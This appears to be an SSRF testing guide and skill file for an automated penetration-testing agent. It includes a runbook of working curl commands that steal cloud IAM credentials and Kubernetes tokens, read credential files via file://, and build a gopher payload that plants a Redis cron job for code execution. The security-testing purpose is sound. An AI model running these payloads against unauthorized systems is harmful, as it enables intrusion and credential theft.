---
name: ssrf
description: SSRF testing for cloud metadata access, internal service discovery, and protocol smuggling
---

# SSRF

Server-Side Request Forgery enables the server to reach networks and services the attacker cannot. Focus on cloud metadata endpoints, service meshes, Kubernetes, and protocol abuse to turn a single fetch into credentials, lateral movement, and sometimes RCE.

## Attack Surface

**Scope**
- Outbound HTTP/HTTPS fetchers (proxies, previewers, importers, webhook testers)
- Non-HTTP protocols via URL handlers (gopher, dict, file, ftp, smb wrappers)
- Service-to-service hops through gateways and sidecars (envoy/nginx)
- Cloud and platform metadata endpoints, instance services, and control planes

**Direct URL Params**
- `url=`, `link=`, `fetch=`, `src=`, `webhook=`, `avatar=`, `image=`

**Indirect Sources**
- Open Graph/link previews, PDF/image renderers
- Server-side analytics (Referer trackers), import/export jobs
- Webhooks/callback verifiers

**Protocol-Translating Services**
- PDF via wkhtmltopdf/Chrome headless, image pipelines
- Document parsers, SSO validators, archive expanders

**Less Obvious**
- GraphQL resolvers that fetch by URL
- Background crawlers, repository/package managers (git, npm, pip)
- Calendar (ICS) fetchers

## High-Value Targets

### AWS

- IMDSv1: `http://169.254.169.254/latest/meta-data/` → `/iam/security-credentials/{role}`, `/user-data`
- IMDSv2: requires token via PUT `/latest/api/token` with header `X-aws-ec2-metadata-token-ttl-seconds`, then include `X-aws-ec2-metadata-token` on subsequent GETs
- If sink cannot set headers or methods, seek intermediaries that can
- ECS/EKS task credentials: `http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`

### GCP

- Endpoint: `http://metadata.google.internal/computeMetadata/v1/`
- Required header: `Metadata-Flavor: Google`
- Target: `/instance/service-accounts/default/token`

### Azure

- Endpoint: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`
- Required header: `Metadata: true`
- MSI OAuth: `/metadata/identity/oauth2/token`

### Kubernetes

- Kubelet: 10250 (authenticated) and 10255 (deprecated read-only)
- Probe `/pods`, `/metrics`, exec/attach endpoints
- API server: `https://kubernetes.default.svc/`
- Authorization often needs service account token; SSRF that propagates headers/cookies may reuse them
- Service discovery: attempt cluster DNS names (`svc.cluster.local`) and default services (kube-dns, metrics-server)

### Internal Services

- Docker API: `http://localhost:2375/v1.24/containers/json` (no TLS variants often internal-only)
- Redis/Memcached: `dict://localhost:11211/stat`, gopher payloads to Redis on 6379
- Elasticsearch/OpenSearch: `http://localhost:9200/_cat/indices`
- Message brokers/admin UIs: RabbitMQ, Kafka REST, Celery/Flower, Jenkins crumb APIs
- FastCGI/PHP-FPM: `gopher://localhost:9000/` (craft records for file write/exec when app routes to FPM)

## Key Vulnerabilities

### Protocol Exploitation

**Gopher**
- Speak raw text protocols (Redis/SMTP/IMAP/HTTP/FCGI)
- Use to craft multi-line payloads, schedule cron via Redis, or build FastCGI requests

**File and Wrappers**
- `file:///etc/passwd`, `file:///proc/self/environ` when libraries allow file handlers
- `jar:`, `netdoc:`, `smb://` and language-specific wrappers (`php://`, `expect://`) where enabled

### Address Variants

- Loopback: `127.0.0.1`, `127.1`, `2130706433`, `0x7f000001`, `::1`, `[::ffff:127.0.0.1]`
- RFC1918/link-local: 10/8, 172.16/12, 192.168/16, 169.254/16
- Test IPv6-mapped and mixed-notation forms

### URL Confusion

- Userinfo and fragments: `http://internal@attacker/` or `http://attacker#@internal/`
- Scheme-less/relative forms the server might complete internally: `//169.254.169.254/`
- Trailing dots and mixed case: `internal.` vs `INTERNAL`, Unicode dot lookalikes

### Redirect Abuse

- Allowlist only applied pre-redirect: 302 from attacker → internal host
- Test multi-hop and protocol switches (http→file/gopher via custom clients)

### Header and Method Control

- Some sinks reflect or allow CRLF-injection into the request line/headers
- If arbitrary headers/methods are possible, IMDSv2, GCP, and Azure become reachable

## Bypass Techniques

**Address Encoding**
- Decimal, hex, octal representations of IP addresses
- IPv6 variants, IPv4-mapped IPv6, mixed notation

**DNS Rebinding**
- First resolution returns allowed IP, second returns internal target
- Use short TTL DNS records under attacker control

**URL Parser Differentials**
- Different parsing between allowlist checker and actual fetcher
- Exploit inconsistencies in scheme, host, port, path handling

**Redirect Chains**
- Initial URL passes allowlist, redirect targets internal host
- Protocol downgrade/upgrade through redirects

## Blind SSRF

- Use OAST (DNS/HTTP) to confirm egress
- Derive internal reachability from timing, response size, TLS errors, and ETag differences
- Build a port map by binary searching timeouts (short connect/read timeouts yield cleaner diffs)

## Chaining Attacks

- SSRF → Metadata creds → cloud API access (list buckets, read secrets)
- SSRF → Redis/FCGI/Docker → file write/command execution → shell
- SSRF → Kubelet/API → pod list/logs → token/secret discovery → lateral movement

## Operational Runbook

Once a candidate user-controlled URL/host param is identified, this is the canonical confirmation + exploitation sequence.

### Step 1 — OAST oracle (fastest confirmation)

```bash
# Spin up a Burp Collaborator client OR use interactsh
interactsh-client -v >/tmp/oast.log &
OAST_HOST=$(grep -oE '[a-z0-9]+\.oast\.fun' /tmp/oast.log | head -1)

# Spray the candidate param against the OAST host
curl -s "<TARGET>?<PARAM>=http://${OAST_HOST}/strix-probe"
sleep 5

# Check log for DNS+HTTP hit
grep "strix-probe" /tmp/oast.log
```

A hit confirms the server made an outbound request to your hostname. This is **evidence #1**.

### Step 2 — internal address probing (loopback first)

Once OAST confirms server-side fetch, escalate to internal:

```bash
# Loopback variants — each form bypasses different filters
for url in \
    "http://127.0.0.1/" \
    "http://localhost/" \
    "http://[::1]/" \
    "http://0.0.0.0/" \
    "http://2130706433/" \
    "http://0x7f.0x0.0x0.0x1/" \
    "http://0177.0.0.01/" \
    "http://[0:0:0:0:0:ffff:127.0.0.1]/"; do
  printf "%-50s → " "$url"
  curl -s -o /tmp/probe.html -w '%{http_code} %{size_download}\n' \
    "<TARGET>?<PARAM>=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$url'))")"
done
```

Different status codes / sizes per probe → the server reached *some* of these endpoints (filter exists but is bypassable). Identical responses across all → strict allowlist (only OAST host accepted earlier).

### Step 3 — cloud metadata sweep

Highest-impact targets first. Try in order; stop on first hit:

```bash
# AWS IMDSv1 (no token needed — most common SSRF win)
curl -s "<TARGET>?<PARAM>=http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  -o /tmp/aws_role.txt
# If the response contains a role name, follow up:
ROLE=$(cat /tmp/aws_role.txt | tr -d '[:space:]')
curl -s "<TARGET>?<PARAM>=http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE}" \
  -o /tmp/aws_creds.json
# Extract AccessKeyId, SecretAccessKey, Token from JSON

# AWS IMDSv2 (token required — try via PUT if HTTP method controllable, else attempt single-shot)
curl -s "<TARGET>?<PARAM>=http://169.254.169.254/latest/api/token"
# If you can issue PUT or the endpoint is misconfigured, retry the meta-data path

# GCP metadata (always requires Metadata-Flavor: Google header — SSRF must permit it)
curl -s "<TARGET>?<PARAM>=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"

# Azure IMDS
curl -s "<TARGET>?<PARAM>=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  -H "Metadata: true"

# Kubernetes service account token (when inside a pod)
curl -s "<TARGET>?<PARAM>=file:///var/run/secrets/kubernetes.io/serviceaccount/token"
```

**Document captured tokens by source + scope, NOT by raw value** — `aws_iam_token captured for role <ROLE>; scope: <permissions>` not the actual token string. Live tokens echoed to the report risk secret-scanner revocation.

### Step 4 — internal service enumeration

```bash
# Quick port-status sweep via SSRF (response-size differential reveals open ports)
for port in 22 80 443 3306 5432 6379 8080 8443 9200 9300 27017 11211; do
  result=$(curl -s "<TARGET>?<PARAM>=http://127.0.0.1:${port}/" \
    -o /dev/null -w '%{http_code} %{size_download} %{time_total}')
  echo "127.0.0.1:${port} → $result"
done
```

Status `200`/`400` (vs `connection refused` → `502`) on a port indicates an open service. High-priority follow-ups: Redis (6379 → can SSRF→gopher RCE), Memcached (11211), Elasticsearch (9200 → full index dump).

### Step 5 — gopher pivot (Redis / MySQL / SMTP RCE)

When SSRF supports `gopher://`, you can craft arbitrary TCP payloads — most useful against Redis for unauth RCE:

```python
# Build a gopher URL that sends Redis commands
redis_cmd = "SET 1 'config_set' \\r\\nCONFIG SET dir /var/spool/cron/\\r\\nCONFIG SET dbfilename root\\r\\nSAVE\\r\\n"
# Each newline → %0D%0A in the gopher URL
encoded = urllib.parse.quote(redis_cmd)
ssrf_url = f"gopher://127.0.0.1:6379/_{encoded}"
```

This is high-risk — only execute when `opsec_level: loud` AND the scope explicitly authorizes RCE pivots. Otherwise document the *capability* and stop.

### Step 6 — file:// scheme (LFI via SSRF)

When `file://` is accepted:

```bash
# Read sensitive files via SSRF
curl -s "<TARGET>?<PARAM>=file:///etc/passwd"
curl -s "<TARGET>?<PARAM>=file:///etc/hosts"
curl -s "<TARGET>?<PARAM>=file:///var/run/secrets/kubernetes.io/serviceaccount/token"
curl -s "<TARGET>?<PARAM>=file:///.aws/credentials"
curl -s "<TARGET>?<PARAM>=file:///proc/self/environ"  # env vars
```

### Step 7 — DNS rebinding (TOCTOU bypass)

When the target validates the hostname BEFORE the actual fetch and the gap is exploitable, use DNS rebinding:

```bash
# Set up a domain whose A record alternates between 1.2.3.4 (allowlisted CDN)
# and 169.254.169.254 (target). Tools: rbndr.us, taviso/rbndr
# Many targets that "allow whitelisted CDN" lose because validation hits
# the public IP, then the actual fetch hits the metadata IP.

curl -s "<TARGET>?<PARAM>=http://1.2.3.4.169.254.169.254.rbndr.us/latest/meta-data/iam/"
```

## Testing Methodology

1. **Identify surfaces** - Every user-influenced URL/host/path across web/mobile/API and background jobs
2. **Establish oracle** - Quiet OAST DNS/HTTP callbacks first
3. **Internal addressing** - Pivot to loopback, RFC1918, link-local, IPv6, hostnames
4. **Protocol variations** - Test gopher, file, dict where supported
5. **Parser differentials** - Test across frameworks, CDNs, and language libraries
6. **Redirect behavior** - Single-hop, multi-hop, protocol switches
7. **Header/method control** - Can you influence request headers or HTTP method?
8. **High-value targets** - Metadata, kubelet, Redis, FastCGI, Docker, Vault, internal admin panels

## Validation

1. Prove an outbound server-initiated request occurred (OAST interaction or internal-only response differences)
2. Show access to non-public resources (metadata, internal admin, service ports) from the vulnerable service
3. Where possible, demonstrate minimal-impact credential access (short-lived token) or a harmless internal data read
4. Confirm reproducibility and document request parameters that control scheme/host/headers/method and redirect behavior

## False Positives

- Client-side fetches only (no server request)
- Strict allowlists with DNS pinning and no redirect following
- SSRF simulators/mocks returning canned responses without real egress
- Blocked egress confirmed by uniform errors across all targets and protocols

## Impact

- Cloud credential disclosure with subsequent control-plane/API access
- Access to internal control panels and data stores not exposed publicly
- Lateral movement into Kubernetes, service meshes, and CI/CD
- RCE via protocol abuse (FCGI, Redis), Docker daemon access, or scriptable admin interfaces

## Pro Tips

1. Prefer OAST callbacks first; then iterate on internal addressing and protocols
2. Test IPv6 and mixed-notation addresses; filters often ignore them
3. Observe library/client differences (curl, Java HttpClient, Node, Go); behavior changes across services and jobs
4. Redirects are leverage: control both the initial allowlisted host and the next hop
5. Metadata endpoints require headers/methods; verify if your sink can set them or if intermediaries add them
6. Use tiny payloads and tight timeouts to map ports with minimal noise
7. When responses are masked, diff length/ETag/status and TLS error classes to infer reachability
8. Chain quickly to durable impact (short-lived tokens, harmless internal reads) and stop there

## Summary

Any feature that fetches remote content on behalf of a user is a potential tunnel to internal networks and control planes. Bind scheme/host/port/headers explicitly or expect an attacker to route through them.
